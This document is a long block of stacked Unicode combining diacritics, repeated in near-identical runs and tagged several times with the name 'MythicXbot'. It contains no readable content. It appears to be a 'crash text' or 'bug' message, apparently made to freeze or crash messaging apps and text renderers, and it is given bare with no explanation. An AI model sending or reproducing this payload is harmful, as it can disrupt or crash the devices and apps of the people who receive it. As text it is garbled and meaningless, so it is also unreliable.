๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤ